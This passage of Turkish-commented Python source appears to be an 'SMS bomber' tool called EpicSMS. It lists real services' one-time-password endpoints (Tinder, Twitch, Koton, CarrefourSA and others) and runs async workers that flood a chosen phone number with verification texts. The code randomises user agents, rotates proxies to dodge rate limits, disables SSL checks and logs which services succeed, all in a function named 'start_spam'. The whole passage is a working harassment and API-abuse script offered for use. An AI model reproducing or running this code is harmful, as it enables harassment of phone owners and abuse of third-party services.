    SMSProvider("Boyner", "https://www.boyner.com.tr/v2/customer/register/otp", boyner_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Morhipo", "https://www.morhipo.com/customer/register/otp", morhipo_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("CarrefourSA", "https://api.carrefoursa.com/auth/send-otp", carrefoursa_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Gratis", "https://www.gratis.com/api/register/send-otp", gratis_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Koton", "https://www.koton.com/api/auth/send-otp", koton_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Youla", "https://youla.ru/web-api/auth/request_code", youla_payload, youla_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Tinder", "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms", tinder_payload, tinder_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("MyGames", "https://auth.api.mygames.com/v1/send-otp", mygames_payload, mygames_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Beltelecom", "https://my.beltelecom.by/api/v1/auth/send-otp", beltelecom_payload, beltelecom_condition, headers={"Content-Type": "application/json"}, cooldown=5),
    SMSProvider("Twitch", "https://passport.twitch.tv/phone_verification/send", twitch_payload, twitch_condition, headers={"Content-Type": "application/json"}, cooldown=5),
]

# SMS Gönderme Fonksiyonu
async def send_sms(phone_number, provider, session, proxy_list):
    global all_sends, success_sends, failed_sends
    if provider.disabled:
        logging.info(f"{provider.name} devre dışı, atlanıyor.")
        return
    if provider.last_used and (time.time() - provider.last_used < provider.cooldown):
        wait_time = provider.cooldown - (time.time() - provider.last_used)
        logging.info(f"{provider.name} için {wait_time:.2f} saniye bekleniyor.")
        await asyncio.sleep(wait_time)
    provider.last_used = time.time()
    all_sends += 1

    url = provider.url.format(phone_number=phone_number) if "{phone_number}" in provider.url else provider.url
    payload = provider.payload_func(phone_number)
    headers = provider.headers.copy()
    headers["User-Agent"] = ua.random

    logging.info(f"Gönderiliyor: {provider.name} -> {phone_number}")
    try:
        proxy = random.choice(proxy_list) if proxy_list and all_sends % 10 == 0 else None
        if proxy:
            logging.info(f"Proxy kullanılıyor: {proxy}")
        
        if provider.method == "GET":
            response = await session.get(url, headers=headers, proxy=proxy, ssl=False)
        else:
            response = await session.post(url, headers=headers, json=payload if "application/json" in headers.get("Content-Type", "") else None, data=payload if "application/x-www-form-urlencoded" in headers.get("Content-Type", "") else None, proxy=proxy, ssl=False)

        response_text = await response.text()
        if provider.success_condition(response):
            success_sends += 1
            logging.info(f"Başarılı: {provider.name} -> {phone_number} - Status: {response.status}")
            c.execute("INSERT OR REPLACE INTO apis (name, success, failure) VALUES (?, COALESCE((SELECT success FROM apis WHERE name = ?), 0) + 1, COALESCE((SELECT failure FROM apis WHERE name = ?), 0))", (provider.name, provider.name, provider.name))
        else:
            failed_sends += 1
            logging.warning(f"Başarısız: {provider.name} -> {phone_number} - Status: {response.status} - Yanıt: {response_text}")
            c.execute("INSERT OR REPLACE INTO apis (name, success, failure) VALUES (?, COALESCE((SELECT success FROM apis WHERE name = ?), 0), COALESCE((SELECT failure FROM apis WHERE name = ?), 0) + 1)", (provider.name, provider.name, provider.name))

    except Exception as e:
        failed_sends += 1
        logging.error(f"Hata: {provider.name} -> {phone_number} - {str(e)}")
        if "getaddrinfo failed" in str(e) or "timeout" in str(e):
            provider.disabled = True
            logging.info(f"{provider.name} geçici olarak devre dışı, 60 saniye bekleniyor.")
            await asyncio.sleep(60)
            provider.disabled = False

    conn.commit()

# Worker Fonksiyonu
async def worker(phone_number, providers, proxy_list, interval):
    async with aiohttp.ClientSession() as session:
        while running:
            random.shuffle(providers)
            for provider in providers:
                if not running:
                    break
                await send_sms(phone_number, provider, session, proxy_list)
                await asyncio.sleep(interval)

# Ana Çalıştırma
async def start_spam(phone_number, amount, worker_amount, interval, use_proxy):
    global running
    running = True
    proxy_list = fetch_proxies() if use_proxy else []
    tasks = []
    providers = epicsms_providers.copy()

    logging.info(f"Başlatılıyor: {worker_amount} worker, {amount} SMS, {interval} saniye aralık")
    with tqdm(total=amount, desc="EpicSMS İlerleme", unit="SMS") as pbar:
        for _ in range(min(worker_amount, amount)):
            task = asyncio.create_task(worker(phone_number, providers, proxy_list, interval))
            tasks.append(task)

        while running and all_sends < amount:
            pbar.update(all_sends - pbar.n)
            await asyncio.sleep(1)

        running = False
        for task in tasks:
            task.cancel()

    print(f"\nToplam Gönderim: {all_sends} | Başarılı: {success_sends} | Başarısız: {failed_sends}")

# Eski Giriş (Senin Sevdiğin)
def main():
    print(Fore.CYAN + "=== EpicSMS - SMS Gönderme Aracı ===" + Style.RESET_ALL)
    phone_number = input("Telefon numarası (örn: 5551234567): ")
    try:
        phone_number = validate_phone_number(phone_number)
    except ValueError as e:
        print(Fore.RED + str(e) + Style.RESET_ALL)
        return

    amount = int(input("Gönderilecek SMS miktarı: "))
    worker_amount = int(input("Worker sayısı (önerilen: 5-10): "))
    interval = float(input("Gönderim aralığı (saniye): "))
    use_proxy = input("Proxy kullanmak ister misiniz? [E/H]: ").lower() == "e"

    asyncio.run(start_spam(phone_number, amount, worker_amount, interval, use_proxy))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        running = False
        print(Fore.YELLOW + "\nDurduruldu!" + Style.RESET_ALL)
    finally:
        conn.close()
